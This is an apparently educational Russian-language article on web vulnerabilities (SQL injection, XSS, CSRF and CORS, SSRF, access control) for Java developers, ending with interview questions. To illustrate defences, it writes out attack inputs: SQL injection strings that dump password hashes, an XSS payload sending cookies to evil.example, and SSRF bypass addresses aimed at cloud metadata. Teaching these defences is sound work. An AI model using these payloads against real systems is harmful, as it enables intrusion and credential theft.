Web Vulnerabilities

Большинство веб-уязвимостей — одна ошибка в разных местах: данные от пользователя попадают туда, где их считают кодом или командой. В SQL — инъекция, в HTML — XSS, в адрес исходящего запроса — SSRF. Защита — разделять данные и код: параметры запроса вместо склейки, экранирование под конкретный контекст, проверка адреса после разрешения имени. Вторая группа — запросы, которые браузер отправляет от имени пользователя: CSRF закрывают SameSite и CSRF-токен, а CORS ослабляет защиту браузера и от CSRF не спасает. Первое место в OWASP Top 10 — ошибки контроля доступа, которые не ловит ни один фреймворк.

Атакующему не нужно ломать шифрование, если приложение само выполнит его ввод

Отчёты пентестеров платёжных систем похожи друг на друга. Поиск по магазину подставляет строку в SQL. Комментарий к платежу выводится в админке как HTML. Загрузка логотипа по URL позволяет серверу сходить на внутренний адрес облака и забрать ключи. Ручка /payments/{id} отдаёт чужие платежи, если подставить другой id. Ни в одном случае не взламывали криптографию: приложение само выполнило то, что прислал атакующий.

OWASP Top 10 — список самых распространённых классов уязвимостей. В редакции 2025 года первые места — нарушение контроля доступа, ошибки конфигурации и атаки на цепочку поставок зависимостей; инъекции на пятом месте, SSRF вошёл в контроль доступа. Тема разбирает механику главных атак и защит. Как Spring Security включает CSRF и CORS, разобрано в Architecture, правила доступа — в Authorization. Демо WebVulnDemo.java работает с настоящей H2 2.5 в памяти: mvn -q dependency:build-classpath -Dmdep.outputFile=target/classpath.txt, затем java -cp "$(cat target/classpath.txt)" WebVulnDemo.java.

SQL-инъекция: строка пользователя становится частью запроса

Поиск платежей магазина собирает SQL склейкой строк. Атакующий вводит не id магазина, а кусок SQL:

String input = "m-7' OR '1'='1";
"select id, amount from payment where merchant = '" + input + "'";   // Склейка.

String union = "x' UNION SELECT 0, password_hash FROM app_user --";    // Чужая таблица.

var ps = db.prepareStatement("select id, amount from payment where merchant = ?");
ps.setString(1, input);                                                 // Значение отдельно от текста.
== sql injection
concat:   [1:500, 2:700, 3:90000, 4:12000]
union:    Data conversion error converting "$2a$12$Q9..."; SQL statement:
prepared: []

Кавычка во вводе закрыла строковый литерал, а OR '1'='1' сделал условие истинным для всех строк: магазин m-7 увидел платежи m-9. Второй ввод присоединил запрос к таблице пользователей. Типы колонок не совпали, и запрос упал — но текст ошибки содержит хеш пароля администратора. Если приложение отдаёт текст исключения клиенту, это готовый канал утечки: так работает error-based инъекция. Даже без текста ошибок данные вытаскивают по одному биту через разницу в ответах или во времени (blind SQLi).

С PreparedStatement строка уходит в базу отдельно от текста запроса, и база никогда не разбирает её как SQL: платежей магазина с именем m-7' OR '1'='1 нет. Экранирование кавычек вручную — плохая замена: в разных базах и кодировках свои правила. Параметризовать нельзя имена колонок, таблиц и направление сортировки, их берут из белого списка, как в API Design. JPA не защищает автоматически: склейка в JPQL или нативном запросе даёт ту же инъекцию.

XSS: экранировать нужно под контекст, куда попадают данные

Комментарий к платежу выводится оператору поддержки в админке. Атакующий оставляет комментарий с HTML, и браузер оператора выполняет его скрипт с правами оператора:

== xss
raw:         <p><img src=x onerror=fetch('//evil.example/?c='+document.cookie)></p>
html-escape: <p>&lt;img src=x onerror=fetch(&#39;//evil.example/?c=&#39;+document.cookie)&gt;</p>
href, escaped but unsafe: <a href="javascript:fetch(&#39;//evil.example/?c=&#39;+document.cookie)">site</a>
href, scheme allow-list:  rejected (scheme javascript)

Экранирование превращает < в &lt;, и браузер показывает тег как текст. Но правильное экранирование зависит от места. Ссылка на сайт магазина прошла HTML-экранирование и осталась опасной: в атрибуте href схема javascript: выполнит код по клику, и кавычки тут ни при чём. Для URL проверяют схему по белому списку, внутри <script> нужно JavaScript-экранирование, в CSS — своё. Шаблонизаторы вроде Thymeleaf экранируют HTML по умолчанию, а React — при выводе текста, поэтому XSS обычно появляется там, где экранирование выключили: th:utext, dangerouslySetInnerHTML, сборка HTML строкой.

Если разметку от пользователя нужно сохранить, её не экранируют, а очищают санитайзером по белому списку тегов, например OWASP Java HTML Sanitizer. Второй рубеж — Content Security Policy: заголовок Content-Security-Policy: script-src 'self' запрещает браузеру выполнять inline-скрипты и скрипты с чужих доменов, и даже пропущенная инъекция не исполнится. Cookie сессии с HttpOnly XSS не прочитает, но скрипт всё равно может делать запросы от имени пользователя, пока страница открыта.

CSRF: браузер отправляет cookie с чужой страницы, и CORS этого не запрещает

Оператор залогинен в админке admin.pay.example. В соседней вкладке он открывает страницу атакующего, на которой скрытая форма отправляет POST на admin.pay.example/payouts. Браузер прикладывает cookie сессии к запросу на её сайт, кто бы ни инициировал запрос, — и выплата уходит. Это CSRF, подделка межсайтового запроса.

Политика одного источника (same-origin policy) запрещает странице читать ответы чужого сайта, но не запрещает отправлять ему простые запросы: формы, картинки, GET и POST с обычными типами содержимого. Поэтому защита от CSRF — на стороне сервера. SameSite=Lax не даёт браузеру приложить cookie к межсайтовым POST; CSRF-токен — случайное значение в форме или заголовке, которое чужая страница не может узнать. Для API с токеном в заголовке Authorization CSRF не страшен: браузер не прикладывает такой заголовок сам.

CORS — способ ослабить политику одного источника: сервер заголовком Access-Control-Allow-Origin разрешает конкретным доменам читать свои ответы. Для запросов с нестандартными заголовками или методами браузер сначала отправляет preflight-запрос OPTIONS. Опасная настройка — отражать в ответе любой присланный Origin вместе с Access-Control-Allow-Credentials: true: тогда любой сайт читает ответы от имени залогиненного пользователя. Сочетание * с credentials браузер запрещает, поэтому ошибку «чинят» отражением и получают уязвимость.

SSRF: сервер сам идёт по адресу из запроса, в том числе во внутреннюю сеть

Магазин указывает URL логотипа, и платёжный сервис скачивает картинку. Атакующий указывает http://169.254.169.254/latest/meta-data/ — адрес сервиса метаданных облака, доступный только изнутри. Сервер послушно сходит туда и вернёт временные ключи доступа к облачному аккаунту. Наивная защита проверяет строку хоста, а у адреса много записей:

// Наивно: запрет по строке хоста.
host.startsWith("169.254.") || host.equals("localhost") || host.startsWith("127.")

// Строго: только https:443, затем разрешить имя и проверить каждый адрес.
for (InetAddress a : InetAddress.getAllByName(u.getHost()))
    if (a.isLoopbackAddress() || a.isLinkLocalAddress() || a.isSiteLocalAddress() || a.isAnyLocalAddress()) ...
== ssrf
https://example.com/logo.png               naive=allowed  strict=allowed
https://169.254.169.254/latest/meta-data/  naive=blocked  strict=blocked (169.254.169.254)
https://2852039166/latest/meta-data/       naive=allowed  strict=blocked (169.254.169.254)
https://[::ffff:127.0.0.1]/                naive=allowed  strict=blocked (127.0.0.1)
https://localtest.me/                      naive=allowed  strict=blocked (127.0.0.1)
http://localhost:8080/actuator/env         naive=blocked  strict=blocked (scheme/port)

Число 2852039166 — тот же 169.254.169.254, записанный одним десятичным числом. IPv6-форма ::ffff:127.0.0.1 — это loopback. Публичное имя localtest.me разрешается в 127.0.0.1. Строковые проверки пропустили все три, проверка после разрешения имени — нет. Но и она не последний рубеж: между проверкой и запросом DNS может ответить иначе (DNS rebinding), поэтому соединяться нужно с тем адресом, который проверили, а редиректы — запретить или проверять каждый.

Надёжнее всего, чтобы исходящие запросы по адресам от пользователей шли через отдельный прокси без доступа во внутреннюю сеть, а сервис метаданных облака требовал токен сессии, как IMDSv2 в AWS. Белый список доменов, если он возможен, лучше любых чёрных списков.

Первое место — контроль доступа, и его проверяет только сам код

GET /payments/p-1042 возвращает платёж, если пользователь залогинен. Магазин m-7 меняет id в адресе и читает платежи m-9. Это IDOR — небезопасная прямая ссылка на объект, самая частая уязвимость из первой категории OWASP. Фреймворк проверил, что пользователь аутентифицирован и имеет роль merchant, но не может знать, что платёж p-1042 принадлежит другому магазину. Проверка владения — в коде: запрос where id = ? and merchant_id = ? или явная проверка после загрузки, о чём подробно в Authorization. Непредсказуемые UUID вместо последовательных id усложняют перебор, но проверку не заменяют.

Вторая категория — ошибки конфигурации: открытые /actuator/env и /v3/api-docs, стектрейсы в ответах, отладка в проде, ключи по умолчанию. Третья — зависимости: уязвимость в библиотеке, как Log4Shell, или вредоносный пакет. Их ловят сканированием зависимостей в CI, фиксацией версий и проверкой целостности артефактов.

Мы используем Spring Security и ORM, значит, от OWASP Top 10 защищены.

Фреймворк закрывает механику: параметризует запросы JPA, экранирует шаблоны, включает CSRF-защиту. Он не знает, чей платёж, не мешает склеить нативный SQL, вывести th:utext или скачать URL из запроса. Первое место списка — контроль доступа, и его пишет разработчик.

  • Инъекции — данные стали кодом. SQL: PreparedStatement; в демо склейка отдала чужие платежи, а текст ошибки — хеш пароля.
  • XSS: экранирование под контекст, проверка схемы URL, санитайзер для разметки, CSP вторым рубежом.
  • CSRF: браузер прикладывает cookie к чужим запросам; SameSite и CSRF-токен. CORS разрешает чтение ответов и от CSRF не защищает.
  • SSRF: проверять адрес после разрешения имени, соединяться с проверенным адресом, не следовать редиректам.
  • Контроль доступа к конкретному объекту — в коде; конфигурация и зависимости — отдельные категории риска.

На собеседовании

Как работает SQL-инъекция и как от неё защититься?

Ввод пользователя вклеивается в текст SQL, и кавычка во вводе завершает литерал: дальше идёт код атакующего — OR '1'='1', UNION с чужой таблицей, вызов функций. Защита — PreparedStatement с параметрами: значение передаётся отдельно от текста и никогда не разбирается как SQL. Имена колонок и направление сортировки параметризовать нельзя, их берут из белого списка.

  • Текст исключений не отдают клиенту: error-based инъекция выносит данные в сообщении об ошибке.
  • Blind-инъекция достаёт данные по разнице в ответах или во времени выполнения.
  • JPA защищает только параметры; склейка в JPQL и нативных запросах уязвима. Учётка приложения в базе — с минимальными правами.

Что такое CSRF и как он связан с CORS?

CSRF — страница атакующего отправляет запрос на сайт, где пользователь залогинен, и браузер сам прикладывает cookie сессии. Политика одного источника запрещает прочитать ответ, но не отправить запрос. Защита — SameSite=Lax или Strict для cookie и CSRF-токен в формах и заголовках.

CORS — способ разрешить чужим доменам читать ответы. Он ослабляет защиту, а не усиливает, и от CSRF не спасает: простые запросы уходят без preflight.

  • API с токеном в Authorization не подвержен CSRF: браузер не прикладывает заголовок сам.
  • Отражение любого Origin вместе с Allow-Credentials даёт любому сайту чтение данных пользователя.
  • SameSite считает поддомены одним сайтом, поэтому захваченный поддомен обходит его.
Что не так с этим CORS-фильтром? 
String origin = request.getHeader("Origin");
response.setHeader("Access-Control-Allow-Origin", origin);
response.setHeader("Access-Control-Allow-Credentials", "true");

Фильтр разрешает любому сайту читать ответы с cookie пользователя: страница атакующего делает fetch с credentials и получает платежи и профиль жертвы. Нужен явный белый список доменов, а для чужих Origin заголовки не выставляются; в Spring — CorsConfiguration со списком allowedOrigins.

Как защититься от XSS?

Экранировать вывод под контекст: в HTML-тексте и атрибутах — HTML-сущности, в URL — проверка схемы по белому списку, внутри скриптов — JavaScript-экранирование. Использовать шаблонизаторы с экранированием по умолчанию и не обходить его. Разметку от пользователей пропускать через санитайзер.

  • CSP без unsafe-inline запрещает выполнение внедрённых скриптов — второй рубеж.
  • HttpOnly защищает cookie, но не запросы, которые скрипт делает от имени пользователя.
  • Stored XSS в админке опаснее всего: код выполняется с правами оператора.

Что такое SSRF и почему проверка по строке хоста не работает?

Сервер делает запрос по адресу из ввода пользователя и попадает во внутреннюю сеть: сервис метаданных облака, админки, базы. Проверка строки хоста обходится другими записями адреса: десятичным числом, IPv6-формой, публичным именем, которое разрешается во внутренний адрес. Проверять нужно разрешённые IP-адреса и разрешать только нужные схемы и порты.

  • DNS rebinding: соединяться с адресом, который проверили, а не разрешать имя повторно.
  • Редиректы запрещать или проверять каждый.
  • Изоляция: исходящий прокси без доступа во внутреннюю сеть, IMDSv2 в AWS.
